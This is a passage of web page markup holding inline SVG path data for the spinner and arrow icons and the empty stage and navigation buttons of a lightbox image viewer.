0-0.828-0.672-1.5-1.5-1.5s-1.5 0.672-1.5 1.5c0 4.418 3.582 8 8 8z"></path><path class="fbx-icon-spinner-6" d="M0.001 8.025l-0 0c0 0 0 0.001 0 0.003 0.002 0.061 0.009 0.12 0.021 0.177 0.003 0.027 0.007 0.057 0.011 0.090 0.003 0.029 0.007 0.061 0.011 0.095 0.006 0.040 0.012 0.083 0.019 0.128 0.013 0.090 0.028 0.189 0.045 0.296 0.021 0.101 0.044 0.21 0.068 0.326 0.011 0.058 0.028 0.117 0.044 0.178s0.032 0.123 0.049 0.188c0.009 0.032 0.016 0.065 0.027 0.097s0.021 0.065 0.031 0.098 0.043 0.134 0.065 0.203c0.006 0.017 0.011 0.035 0.017 0.052s0.013 0.034 0.019 0.052 0.026 0.070 0.039 0.105c0.027 0.070 0.053 0.142 0.081 0.215 0.031 0.071 0.062 0.144 0.094 0.218 0.016 0.037 0.032 0.074 0.048 0.111s0.035 0.073 0.053 0.111 0.073 0.148 0.11 0.224c0.039 0.075 0.081 0.149 0.123 0.224 0.021 0.037 0.042 0.075 0.063 0.113s0.045 0.074 0.068 0.112 0.093 0.149 0.14 0.224c0.198 0.295 0.417 0.587 0.66 0.864 0.245 0.275 0.511 0.535 0.792 0.775 0.284 0.236 0.582 0.452 0.886 0.642 0.306 0.188 0.619 0.349 0.928 0.487 0.078 0.032 0.156 0.063 0.232 0.095 0.038 0.015 0.076 0.032 0.115 0.046s0.077 0.027 0.115 0.041 0.151 0.054 0.226 0.078c0.075 0.022 0.15 0.044 0.224 0.066 0.037 0.011 0.073 0.022 0.109 0.031s0.073 0.018 0.109 0.027 0.143 0.035 0.213 0.052c0.070 0.014 0.139 0.027 0.207 0.040 0.034 0.006 0.067 0.013 0.101 0.019 0.017 0.003 0.033 0.006 0.049 0.009s0.033 0.005 0.049 0.007c0.066 0.009 0.13 0.018 0.192 0.027 0.031 0.004 0.062 0.009 0.093 0.013s0.061 0.006 0.091 0.009 0.118 0.010 0.174 0.015c0.056 0.005 0.111 0.011 0.164 0.012 0.004 0 0.007 0 0.011 0 0.010 0.544 0.453 0.982 1 0.982 0.008 0 0.017-0 0.025-0.001v0c0 0 0.001-0 0.004-0 0.061-0.002 0.12-0.009 0.177-0.021 0.027-0.003 0.057-0.007 0.090-0.011 0.029-0.003 0.061-0.007 0.095-0.011 0.040-0.006 0.083-0.012 0.128-0.019 0.090-0.013 0.189-0.028 0.296-0.045 0.101-0.021 0.21-0.044 0.326-0.068 0.058-0.011 0.117-0.028 0.178-0.044s0.123-0.033 0.188-0.049c0.032-0.009 0.065-0.016 0.097-0.027s0.065-0.021 0.098-0.031 0.134-0.043 0.203-0.065c0.017-0.006 0.035-0.011 0.052-0.017s0.034-0.013 0.052-0.019 0.070-0.026 0.105-0.039c0.070-0.027 0.142-0.053 0.215-0.081 0.071-0.031 0.144-0.062 0.218-0.094 0.037-0.016 0.074-0.032 0.111-0.048s0.073-0.035 0.111-0.053 0.148-0.073 0.224-0.11c0.075-0.039 0.149-0.081 0.224-0.123 0.037-0.021 0.075-0.042 0.113-0.063s0.074-0.045 0.112-0.068 0.149-0.093 0.224-0.14c0.295-0.197 0.587-0.417 0.864-0.66 0.275-0.245 0.535-0.511 0.775-0.792 0.236-0.284 0.452-0.582 0.642-0.886 0.188-0.306 0.349-0.619 0.487-0.928 0.032-0.078 0.063-0.156 0.095-0.232 0.015-0.038 0.032-0.076 0.046-0.115s0.027-0.077 0.040-0.115 0.054-0.151 0.078-0.226c0.022-0.075 0.044-0.15 0.066-0.224 0.011-0.037 0.022-0.073 0.031-0.109s0.018-0.073 0.027-0.109 0.035-0.143 0.052-0.213c0.014-0.070 0.027-0.139 0.040-0.207 0.006-0.034 0.013-0.067 0.019-0.101 0.003-0.017 0.006-0.033 0.009-0.049s0.005-0.033 0.007-0.050c0.009-0.065 0.018-0.13 0.027-0.192 0.004-0.031 0.009-0.062 0.013-0.093s0.006-0.061 0.009-0.091 0.010-0.118 0.015-0.174c0.005-0.056 0.011-0.111 0.012-0.165 0-0.008 0.001-0.016 0.001-0.025 0.55-0.002 0.996-0.449 0.996-1 0-0.008-0-0.017-0.001-0.025h0c0 0-0-0.001-0-0.003-0.002-0.061-0.009-0.12-0.021-0.177-0.003-0.027-0.007-0.057-0.011-0.090-0.003-0.029-0.007-0.061-0.011-0.095-0.006-0.040-0.012-0.083-0.019-0.128-0.013-0.090-0.028-0.189-0.045-0.296-0.021-0.101-0.044-0.21-0.068-0.326-0.011-0.058-0.028-0.117-0.044-0.178s-0.032-0.123-0.049-0.188c-0.009-0.032-0.016-0.065-0.027-0.097s-0.021-0.065-0.031-0.098-0.043-0.134-0.065-0.203c-0.005-0.017-0.011-0.035-0.017-0.052s-0.013-0.034-0.019-0.052-0.026-0.070-0.039-0.105c-0.027-0.070-0.053-0.142-0.081-0.215-0.031-0.071-0.062-0.144-0.094-0.218-0.016-0.037-0.032-0.074-0.048-0.111s-0.035-0.073-0.053-0.111-0.073-0.148-0.11-0.224c-0.039-0.075-0.081-0.149-0.123-0.224-0.021-0.037-0.042-0.075-0.063-0.113s-0.045-0.074-0.068-0.112-0.093-0.149-0.14-0.224c-0.197-0.295-0.417-0.587-0.66-0.864-0.245-0.275-0.511-0.535-0.792-0.775-0.284-0.236-0.582-0.452-0.886-0.642-0.306-0.188-0.619-0.349-0.928-0.487-0.078-0.032-0.156-0.063-0.232-0.095-0.038-0.015-0.076-0.032-0.115-0.046s-0.077-0.027-0.115-0.040-0.151-0.054-0.226-0.078c-0.075-0.022-0.15-0.044-0.224-0.066-0.037-0.010-0.073-0.022-0.109-0.031s-0.073-0.018-0.109-0.027-0.143-0.035-0.213-0.052c-0.070-0.014-0.139-0.027-0.207-0.040-0.034-0.006-0.067-0.013-0.101-0.019-0.017-0.003-0.033-0.006-0.049-0.009s-0.033-0.005-0.049-0.007c-0.066-0.009-0.13-0.018-0.192-0.027-0.031-0.004-0.062-0.009-0.093-0.013s-0.061-0.006-0.091-0.009-0.118-0.010-0.174-0.015c-0.056-0.005-0.111-0.011-0.164-0.012-0.013-0-0.026-0.001-0.039-0.001-0.010-0.543-0.454-0.981-0.999-0.981-0.008 0-0.017 0-0.025 0.001l-0-0c0 0-0.001 0-0.003 0-0.061 0.002-0.12 0.009-0.177 0.021-0.027 0.003-0.057 0.007-0.090 0.011-0.029 0.003-0.061 0.007-0.095 0.011-0.040 0.006-0.083 0.012-0.128 0.019-0.090 0.013-0.189 0.028-0.296 0.045-0.101 0.021-0.21 0.044-0.326 0.068-0.058 0.011-0.117 0.028-0.178 0.044s-0.123 0.033-0.188 0.049c-0.032 0.009-0.065 0.016-0.097 0.027s-0.065 0.021-0.098 0.031-0.134 0.043-0.203 0.065c-0.017 0.006-0.035 0.011-0.052 0.017s-0.034 0.013-0.052 0.019-0.070 0.026-0.105 0.039c-0.070 0.027-0.142 0.053-0.215 0.081-0.071 0.031-0.144 0.062-0.218 0.094-0.037 0.016-0.074 0.032-0.111 0.048s-0.073 0.035-0.111 0.053-0.148 0.073-0.224 0.11c-0.075 0.039-0.149 0.081-0.224 0.123-0.037 0.021-0.075 0.042-0.113 0.063s-0.074 0.045-0.112 0.068-0.149 0.093-0.224 0.14c-0.295 0.198-0.587 0.417-0.864 0.66-0.275 0.245-0.535 0.511-0.775 0.792-0.236 0.284-0.452 0.582-0.642 0.886-0.188 0.306-0.349 0.619-0.487 0.928-0.032 0.078-0.063 0.156-0.095 0.232-0.015 0.038-0.032 0.076-0.046 0.115s-0.027 0.077-0.040 0.115-0.054 0.151-0.078 0.226c-0.022 0.075-0.044 0.15-0.066 0.224-0.011 0.037-0.022 0.073-0.032 0.109s-0.018 0.073-0.027 0.109-0.035 0.143-0.052 0.213c-0.014 0.070-0.027 0.139-0.040 0.207-0.006 0.034-0.013 0.067-0.019 0.101-0.003 0.017-0.006 0.033-0.009 0.049s-0.005 0.033-0.007 0.050c-0.009 0.065-0.018 0.13-0.027 0.192-0.004 0.031-0.009 0.062-0.013 0.093s-0.006 0.061-0.009 0.091-0.010 0.118-0.015 0.174c-0.005 0.056-0.011 0.111-0.012 0.165-0 0.009-0.001 0.017-0.001 0.025-0.537 0.017-0.967 0.458-0.967 0.999 0 0.008 0 0.017 0.001 0.025zM1.149 7.011c0.001-0.003 0.001-0.006 0.002-0.009 0.010-0.051 0.026-0.102 0.040-0.155s0.030-0.107 0.045-0.163c0.008-0.028 0.015-0.056 0.024-0.084s0.019-0.057 0.028-0.086 0.038-0.116 0.058-0.176c0.005-0.015 0.010-0.030 0.015-0.045s0.012-0.030 0.017-0.045 0.023-0.060 0.035-0.091 0.048-0.123 0.073-0.186c0.028-0.062 0.056-0.125 0.084-0.189 0.014-0.032 0.028-0.064 0.043-0.096s0.032-0.064 0.048-0.096 0.065-0.128 0.098-0.194c0.034-0.065 0.073-0.128 0.109-0.194 0.018-0.032 0.037-0.065 0.056-0.098s0.040-0.064 0.061-0.096c0.041-0.064 0.082-0.129 0.124-0.194 0.176-0.255 0.369-0.506 0.583-0.744 0.217-0.236 0.451-0.459 0.697-0.665 0.25-0.202 0.511-0.385 0.776-0.547 0.268-0.159 0.541-0.294 0.808-0.41 0.068-0.027 0.135-0.053 0.202-0.079 0.033-0.013 0.066-0.027 0.099-0.038s0.067-0.022 0.1-0.033 0.131-0.045 0.196-0.065c0.065-0.018 0.13-0.036 0.194-0.054 0.032-0.009 0.063-0.019 0.095-0.026s0.063-0.014 0.094-0.021 0.123-0.028 0.184-0.042c0.061-0.011 0.12-0.021 0.179-0.032 0.029-0.005 0.058-0.010 0.087-0.015 0.014-0.003 0.029-0.005 0.043-0.008s0.029-0.003 0.043-0.005c0.056-0.007 0.112-0.014 0.166-0.020 0.027-0.003 0.053-0.007 0.080-0.010s0.053-0.004 0.078-0.006 0.102-0.007 0.15-0.011c0.049-0.003 0.095-0.008 0.142-0.008 0.091-0.002 0.177-0.004 0.256-0.006 0.073 0.003 0.14 0.005 0.2 0.007 0.030 0.001 0.058 0.002 0.085 0.002 0.033 0.002 0.064 0.004 0.093 0.006 0.033 0.002 0.063 0.004 0.091 0.006 0.051 0.008 0.103 0.012 0.156 0.012 0.007 0 0.015-0 0.022-0.001 0.002 0 0.004 0 0.004 0v-0c0.487-0.012 0.887-0.372 0.962-0.84 0.008 0.002 0.017 0.004 0.025 0.006 0.051 0.010 0.102 0.026 0.155 0.040s0.107 0.030 0.163 0.045c0.028 0.008 0.056 0.015 0.084 0.024s0.057 0.019 0.086 0.028 0.116 0.038 0.176 0.058c0.015 0.005 0.030 0.010 0.045 0.015s0.030 0.012 0.045 0.017 0.060 0.023 0.091 0.035 0.123 0.048 0.186 0.073c0.062 0.028 0.125 0.056 0.189 0.084 0.032 0.014 0.064 0.028 0.096 0.043s0.064 0.032 0.096 0.048 0.128 0.065 0.194 0.098c0.065 0.034 0.129 0.073 0.194 0.109 0.032 0.018 0.065 0.037 0.098 0.056s0.064 0.040 0.096 0.061 0.129 0.082 0.194 0.124c0.255 0.176 0.506 0.369 0.744 0.583 0.236 0.217 0.459 0.451 0.665 0.697 0.202 0.25 0.385 0.511 0.547 0.776 0.159 0.268 0.294 0.541 0.41 0.808 0.027 0.068 0.053 0.135 0.079 0.202 0.013 0.033 0.027 0.066 0.038 0.099s0.022 0.067 0.033 0.1 0.045 0.131 0.065 0.196c0.018 0.065 0.036 0.13 0.054 0.194 0.009 0.032 0.019 0.063 0.026 0.095s0.014 0.063 0.021 0.094 0.028 0.123 0.042 0.184c0.011 0.061 0.021 0.12 0.032 0.179 0.005 0.029 0.010 0.058 0.015 0.087 0.003 0.014 0.005 0.029 0.008 0.043s0.003 0.029 0.005 0.043c0.007 0.056 0.014 0.112 0.020 0.166 0.003 0.027 0.007 0.053 0.010 0.080s0.004 0.053 0.006 0.078 0.007 0.102 0.011 0.15c0.003 0.049 0.008 0.095 0.008 0.142 0.002 0.091 0.004 0.177 0.006 0.256-0.003 0.073-0.005 0.14-0.007 0.2-0.001 0.030-0.002 0.058-0.002 0.085-0.002 0.033-0.004 0.064-0.006 0.093-0.002 0.033-0.004 0.063-0.006 0.091-0.008 0.051-0.012 0.103-0.012 0.156 0 0.007 0 0.015 0.001 0.022-0 0.002-0 0.004-0 0.004h0c0.012 0.481 0.363 0.877 0.823 0.959-0.001 0.005-0.002 0.009-0.003 0.014-0.010 0.051-0.025 0.102-0.040 0.155s-0.030 0.107-0.045 0.163c-0.008 0.028-0.015 0.056-0.024 0.084s-0.019 0.057-0.028 0.086-0.039 0.116-0.058 0.176c-0.005 0.015-0.010 0.030-0.015 0.045s-0.012 0.030-0.017 0.045-0.023 0.060-0.035 0.091-0.048 0.123-0.073 0.186c-0.028 0.062-0.056 0.125-0.084 0.189-0.014 0.032-0.028 0.064-0.043 0.096s-0.032 0.064-0.048 0.096-0.065 0.128-0.098 0.194c-0.034 0.065-0.073 0.129-0.109 0.194-0.018 0.032-0.037 0.065-0.056 0.098s-0.040 0.064-0.061 0.096-0.082 0.129-0.124 0.194c-0.176 0.255-0.369 0.506-0.583 0.744-0.217 0.236-0.451 0.459-0.697 0.665-0.25 0.202-0.511 0.385-0.776 0.547-0.268 0.159-0.541 0.294-0.808 0.41-0.068 0.027-0.135 0.053-0.202 0.079-0.033 0.013-0.066 0.027-0.099 0.038s-0.067 0.022-0.1 0.033-0.131 0.045-0.196 0.065c-0.065 0.018-0.13 0.036-0.194 0.054-0.032 0.009-0.063 0.019-0.095 0.026s-0.063 0.014-0.094 0.021-0.123 0.028-0.184 0.042c-0.061 0.011-0.12 0.021-0.179 0.032-0.029 0.005-0.058 0.010-0.087 0.015-0.014 0.003-0.028 0.005-0.043 0.008s-0.029 0.003-0.043 0.005c-0.056 0.007-0.112 0.014-0.166 0.020-0.027 0.003-0.053 0.007-0.080 0.010s-0.053 0.004-0.078 0.006-0.102 0.007-0.15 0.011c-0.049 0.003-0.095 0.008-0.142 0.008-0.091 0.002-0.177 0.004-0.256 0.006-0.073-0.003-0.14-0.005-0.2-0.007-0.030-0.001-0.058-0.002-0.085-0.002-0.033-0.002-0.064-0.004-0.093-0.006-0.033-0.002-0.063-0.004-0.091-0.006-0.051-0.008-0.103-0.012-0.156-0.012-0.007 0-0.015 0-0.022 0.001-0.002-0-0.003-0-0.003-0v0c-0.484 0.012-0.883 0.369-0.961 0.834-0.050-0.010-0.101-0.025-0.153-0.039s-0.107-0.030-0.163-0.045c-0.028-0.008-0.056-0.015-0.084-0.024s-0.057-0.019-0.086-0.028-0.116-0.039-0.176-0.058c-0.015-0.005-0.030-0.010-0.045-0.015s-0.030-0.012-0.045-0.017-0.060-0.023-0.091-0.035-0.123-0.048-0.186-0.073c-0.062-0.028-0.125-0.056-0.189-0.084-0.032-0.014-0.064-0.028-0.096-0.043s-0.064-0.032-0.096-0.048-0.128-0.065-0.194-0.098c-0.065-0.034-0.129-0.073-0.194-0.109-0.032-0.018-0.065-0.037-0.098-0.056s-0.064-0.040-0.096-0.061c-0.064-0.041-0.129-0.082-0.194-0.124-0.255-0.175-0.506-0.369-0.744-0.583-0.236-0.217-0.459-0.451-0.665-0.697-0.202-0.25-0.385-0.511-0.547-0.776-0.159-0.268-0.294-0.541-0.41-0.808-0.027-0.068-0.053-0.135-0.079-0.202-0.013-0.033-0.027-0.066-0.038-0.099s-0.022-0.067-0.033-0.1-0.045-0.131-0.065-0.196c-0.018-0.065-0.036-0.13-0.054-0.194-0.009-0.032-0.019-0.063-0.026-0.095s-0.014-0.063-0.021-0.094-0.028-0.123-0.042-0.184c-0.011-0.061-0.021-0.12-0.032-0.179-0.005-0.029-0.010-0.058-0.015-0.087-0.003-0.014-0.005-0.028-0.008-0.043s-0.003-0.029-0.005-0.043c-0.007-0.056-0.014-0.112-0.020-0.166-0.003-0.027-0.007-0.053-0.010-0.080s-0.004-0.053-0.006-0.078-0.007-0.101-0.011-0.15c-0.003-0.049-0.008-0.095-0.008-0.142-0.002-0.091-0.004-0.177-0.006-0.256 0.003-0.073 0.005-0.14 0.007-0.2 0.001-0.030 0.002-0.058 0.002-0.085 0.002-0.033 0.004-0.064 0.006-0.093 0.002-0.033 0.004-0.063 0.006-0.091 0.008-0.051 0.012-0.103 0.012-0.156 0-0.007-0-0.015-0.001-0.022 0-0.002 0-0.003 0-0.003h-0c-0.012-0.49-0.377-0.893-0.851-0.964z"></path><path class="fbx-icon-spinner-7" d="M16 6.5l-3.527-0.353 2.245-2.743-2.121-2.121-2.743 2.245-0.353-3.527h-3l-0.353 3.527-2.743-2.245-2.121 2.121 2.245 2.743-3.527 0.353v3l3.527 0.353-2.245 2.743 2.121 2.121 2.743-2.245 0.353 3.527h3l0.353-3.527 2.743 2.245 2.121-2.121-2.245-2.743 3.527-0.353v-3zM11 6.757v2.485l-1.757 1.757h-2.485l-1.757-1.757v-2.485l1.757-1.757h2.485l1.757 1.757z"></path><path class="fbx-icon-spinner-8" d="M13.657 2.343c-1.448-1.448-3.447-2.343-5.657-2.343-3.429 0-6.355 2.158-7.492 5.19l1.873 0.702c0.853-2.274 3.047-3.893 5.619-3.893 1.657 0 3.157 0.672 4.242 1.758l-2.242 2.242h6v-6l-2.343 2.343zM8 14c-1.657 0-3.157-0.672-4.242-1.758l2.242-2.242h-6v6l2.344-2.344c1.448 1.448 3.447 2.344 5.656 2.344 3.43 0 6.355-2.158 7.492-5.19l-1.873-0.702c-0.853 2.274-3.047 3.893-5.619 3.893z"></path><path class="fbx-icon-spinner-9" d="M8 3.25c-1.566 0-2.962 0.731-3.849 1.863l-1.2-0.9c1.161-1.496 2.992-2.464 5.048-2.464v-1.75l2.5 2.5-2.5 2.5v-1.75zM8 12.75c1.566 0 2.962-0.731 3.849-1.863l1.2 0.9c-1.161 1.496-2.992 2.464-5.048 2.464v1.75l-2.5-2.5 2.5-2.5v1.75zM3.15 8c0 1.568 0.78 2.961 1.98 3.827l-0.9 1.2c-1.564-1.139-2.58-2.968-2.58-5.026h-1.65l2.5-2.5 2.5 2.5h-1.85zM14.35 8h1.65l-2.5 2.5-2.5-2.5h1.85c0-1.568-0.78-2.961-1.98-3.827l0.9-1.2c1.564 1.139 2.58 2.968 2.58 5.026z"></path><path class="fbx-icon-spinner-10" d="M12.999 3.23v0 0zM13.032 8c1.631-1.56 2.423-3.087 1.896-4-0.301-0.521-0.99-0.77-1.929-0.77v0.75c0.659 0 1.137 0.148 1.28 0.395 0.113 0.195 0.050 0.496-0.023 0.713-0.139 0.417-0.442 0.917-0.876 1.444-0.263 0.32-0.567 0.643-0.904 0.963-0.465-0.402-0.982-0.801-1.544-1.188-0.055-0.679-0.142-1.327-0.257-1.93 0.878-0.26 1.675-0.397 2.323-0.397l0-0.75c-0 0-0 0-0 0-0.706 0-1.553 0.141-2.482 0.413-0.535-2.192-1.462-3.642-2.516-3.642s-1.981 1.45-2.516 3.642c-0.929-0.271-1.777-0.412-2.482-0.412-0.939 0-1.629 0.249-1.93 0.77-0.527 0.913 0.265 2.44 1.896 4-1.631 1.559-2.423 3.087-1.896 4 0.301 0.521 0.99 0.77 1.93 0.77 0.706 0 1.553-0.141 2.482-0.412 0.535 2.192 1.462 3.642 2.516 3.642s1.981-1.45 2.516-3.642c0.929 0.271 1.777 0.412 2.482 0.412 0.939 0 1.629-0.249 1.93-0.77 0.527-0.913-0.265-2.441-1.896-4zM11.915 8c-0.291 0.248-0.601 0.493-0.927 0.734 0.008-0.242 0.013-0.487 0.013-0.734s-0.004-0.492-0.013-0.734c0.327 0.241 0.637 0.486 0.927 0.734zM9.958 11.389c-0.36-0.128-0.728-0.274-1.098-0.435 0.213-0.113 0.426-0.232 0.64-0.355s0.424-0.25 0.63-0.378c-0.045 0.403-0.103 0.793-0.172 1.169zM9.125 9.949c-0.372 0.214-0.748 0.416-1.125 0.603-0.377-0.187-0.753-0.389-1.125-0.603-0.375-0.216-0.737-0.441-1.086-0.672-0.026-0.417-0.039-0.844-0.039-1.277s0.013-0.859 0.039-1.276c0.349-0.231 0.711-0.456 1.086-0.672 0.372-0.215 0.748-0.416 1.125-0.603 0.377 0.187 0.753 0.389 1.125 0.603 0.375 0.216 0.737 0.441 1.086 0.672 0.026 0.417 0.039 0.844 0.039 1.276s-0.013 0.859-0.039 1.277c-0.349 0.231-0.711 0.456-1.086 0.672zM5.87 10.22c0.205 0.128 0.415 0.254 0.63 0.378s0.427 0.242 0.64 0.355c-0.37 0.162-0.738 0.307-1.098 0.435-0.069-0.375-0.127-0.766-0.172-1.168zM5.013 8.734c-0.327-0.241-0.637-0.486-0.927-0.734 0.291-0.248 0.601-0.494 0.927-0.734-0.008 0.242-0.013 0.487-0.013 0.734s0.004 0.492 0.013 0.734zM6.042 4.612c0.36 0.128 0.728 0.274 1.098 0.435-0.213 0.113-0.426 0.232-0.64 0.355s-0.424 0.25-0.63 0.378c0.045-0.403 0.103-0.793 0.172-1.168zM9.5 5.402c-0.214-0.123-0.427-0.242-0.64-0.355 0.37-0.162 0.738-0.307 1.098-0.435 0.069 0.375 0.127 0.766 0.172 1.168-0.205-0.128-0.415-0.254-0.63-0.378zM6.581 2.607c0.24-0.639 0.521-1.151 0.813-1.48 0.152-0.172 0.381-0.376 0.607-0.376s0.454 0.205 0.607 0.376c0.292 0.329 0.573 0.841 0.813 1.48 0.146 0.388 0.273 0.812 0.382 1.265-0.58 0.202-1.185 0.45-1.801 0.743-0.616-0.292-1.221-0.541-1.801-0.743 0.109-0.453 0.237-0.877 0.382-1.265zM2.62 6.532c-0.434-0.527-0.736-1.026-0.876-1.444-0.073-0.218-0.135-0.518-0.023-0.713 0.143-0.247 0.621-0.395 1.28-0.395h0c0.648 0 1.445 0.137 2.323 0.397-0.115 0.603-0.202 1.251-0.257 1.93-0.561 0.387-1.079 0.787-1.544 1.188-0.338-0.321-0.641-0.643-0.904-0.963zM3.002 12.020c-0.659 0-1.137-0.148-1.28-0.395-0.113-0.195-0.050-0.496 0.023-0.713 0.139-0.417 0.442-0.917 0.876-1.444 0.263-0.32 0.567-0.643 0.904-0.963 0.465 0.402 0.982 0.801 1.544 1.188 0.055 0.679 0.142 1.327 0.257 1.93-0.878 0.26-1.675 0.397-2.323 0.397zM9.419 13.393c-0.24 0.639-0.521 1.151-0.813 1.48-0.152 0.172-0.381 0.376-0.607 0.376s-0.454-0.205-0.607-0.376c-0.292-0.329-0.573-0.841-0.813-1.48-0.146-0.388-0.273-0.812-0.382-1.265 0.58-0.202 1.185-0.45 1.801-0.743 0.616 0.292 1.221 0.541 1.801 0.743-0.109 0.453-0.236 0.877-0.382 1.265zM14.256 10.912c0.073 0.218 0.135 0.518 0.023 0.713-0.143 0.248-0.622 0.395-1.28 0.395-0.648 0-1.445-0.137-2.323-0.397 0.115-0.603 0.202-1.251 0.257-1.93 0.561-0.387 1.079-0.787 1.544-1.188 0.338 0.321 0.641 0.643 0.904 0.963 0.434 0.527 0.736 1.027 0.876 1.444zM6.75 8c0-0.69 0.56-1.25 1.25-1.25s1.25 0.56 1.25 1.25c0 0.69-0.56 1.25-1.25 1.25s-1.25-0.56-1.25-1.25z"></path><path class="fbx-icon-spinner-11" d="M7.282 8.718l-5-5-2.282 2.282v-6h6l-2.282 2.282 5 5zM8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8c-4.418 0-8-3.582-8-8h2c0 3.314 2.686 6 6 6s6-2.686 6-6c0-3.314-2.686-6-6-6v-2z"></path></svg></div><div class="fbx-inner fbx-inner-shadow"><div class="fbx-stage"><div class="fbx-item-current"></div><div class="fbx-item-next"></div><div class="fbx-caption fbx-slide-caption"></div></div><button class="fbx-prev fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-prev fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.643q0 0.473-0.29 0.808t-0.754 0.335h-6.286l2.616 2.625q0.339 0.321 0.339 0.804t-0.339 0.804l-0.67 0.679q-0.33 0.33-0.804 0.33-0.464 0-0.813-0.33l-5.813-5.821q-0.33-0.33-0.33-0.804 0-0.464 0.33-0.813l5.813-5.804q0.339-0.339 0.813-0.339 0.464 0 0.804 0.339l0.67 0.661q0.339 0.339 0.339 0.813t-0.339 0.813l-2.616 2.616h6.286q0.464 0 0.754 0.335t0.29 0.808z"></path><path class="fbx-icon-arrows-flat" d="M6.667 3q0.276 0 0.471 0.195t0.195 0.471q0 0.281-0.198 0.474l-3.526 3.526h10.391q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-10.391l3.526 3.526q0.198 0.193 0.198 0.474 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-4.667-4.667q-0.193-0.203-0.193-0.474t0.193-0.474l4.667-4.667q0.198-0.193 0.474-0.193z"></path><path class="fbx-icon-arrows-1" d="M10 16l3-3-5-5 5-5-3-3-8 8z"></path><path class="fbx-icon-arrows-2" d="M0 8l16 7-3-7 3-7z"></path><path class="fbx-icon-arrows-3" d="M12 0l-8 8 8 8-4-8z"></path><path class="fbx-icon-arrows-4" d="M10 4l-4 4 4 4z"></path><path class="fbx-icon-arrows-5" d="M0 8l8 8v-5h8l0-6h-8v-5l-8 8zM2.375 7.039l0.25-0.25v2.422l-0.25-0.25v-1.922zM2.125 8.711l-0.25-0.25v-0.922l0.25-0.25v1.422zM2.875 6.539l0.25-0.25v3.422l-0.25-0.25v-2.922zM3.375 6.039l0.25-0.25v4.422l-0.25-0.25v-3.922zM3.875 5.539l0.25-0.25v5.422l-0.25-0.25v-4.922zM4.375 5.039l0.25-0.25v6.422l-0.25-0.25v-5.922zM4.875 4.539l0.25-0.25v7.422l-0.25-0.25v-6.922zM5.375 4.039l0.25-0.25v8.422l-0.25-0.25v-7.922zM5.875 3.539l0.25-0.25v9.422l-0.25-0.25v-8.922zM6.375 3.039l0.25-0.25v10.422l-0.25-0.25v-9.922zM1.625 7.789v0.422l-0.211-0.211 0.211-0.211zM7.375 10v-4h0.25v4h-0.25zM7.875 10v-4h0.25v4h-0.25zM8.375 10v-4h0.25v4h-0.25zM8.875 10v-4h0.25v4h-0.25zM9.375 10v-4h0.25v4h-0.25zM9.875 10v-4h0.25v4h-0.25zM10.375 10v-4h0.25v4h-0.25zM10.875 10v-4h0.25v4h-0.25zM11.375 10v-4h0.25v4h-0.25zM11.875 10v-4h0.25v4h-0.25zM12.375 10v-4h0.25v4h-0.25zM12.875 10v-4h0.25v4h-0.25zM13.375 10v-4h0.25v4h-0.25zM13.875 10v-4h0.25v4h-0.25zM14.375 10v-4h0.25v4h-0.25zM15 10h-0.125v-4h0.125l-0 4zM7 6h0.125v4h-0.125v3.586l-0.125-0.125v-10.922l0.125-0.125v3.586z"></path><path class="fbx-icon-arrows-6" d="M0 8l8 8v-5h8l0-6h-8v-5z"></path><path class="fbx-icon-arrows-7" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM3.293 8.707l4 4c0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293c0.391-0.391 0.391-1.024 0-1.414l-2.293-2.293h5.586c0.552 0 1-0.448 1-1s-0.448-1-1-1h-5.586l2.293-2.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-4 4c-0.391 0.391-0.391 1.024-0 1.414z"></path><path class="fbx-icon-arrows-8" d="M0 16h16v-16h-16l0 16zM14 2v12h-12l-0-12h12zM7 11.5l-3.5-3.5 3.5-3.5v2.5h5v2h-5v2.5z"></path><path class="fbx-icon-arrows-9" d="M15 5h1v6h-1zM13 5h1v6h-1zM11 5h1v6h-1zM0 8l7-7v4h3v6h-3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM7 11.5v-2.5h5v-2h-5v-2.5l-3.5 3.5 3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM8 14.5c3.59 0 6.5-2.91 6.5-6.5s-2.91-6.5-6.5-6.5-6.5 2.91-6.5 6.5 2.91 6.5 6.5 6.5zM3.293 7.293l4-4c0.391-0.391 1.024-0.391 1.414 0s0.391 1.024 0 1.414l-2.293 2.293h5.586c0.552 0 1 0.448 1 1s-0.448 1-1 1h-5.586l2.293 2.293c0.391 0.391 0.391 1.024 0 1.414-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293l-4-4c-0.39-0.391-0.39-1.024 0-1.414z"></path></svg></button><span class="fbx-count"></span><button class="fbx-next fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-next fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.071q0 0.482-0.33 0.813l-5.813 5.813q-0.348 0.33-0.813 0.33-0.455 0-0.804-0.33l-0.67-0.67q-0.339-0.339-0.339-0.813t0.339-0.813l2.616-2.616h-6.286q-0.464 0-0.754-0.335t-0.29-0.808v-1.143q0-0.473 0.29-0.808t0.754-0.335h6.286l-2.616-2.625q-0.339-0.321-0.339-0.804t0.339-0.804l0.67-0.67q0.339-0.339 0.804-0.339 0.473 0 0.813 0.339l5.813 5.813q0.33 0.313 0.33 0.804z"></path><path class="fbx-icon-arrows-flat" d="M9.333 3q0.281 0 0.474 0.193l4.667 4.667q0.193 0.193 0.193 0.474t-0.193 0.474l-4.667 4.667q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l3.531-3.526h-10.391q-0.276 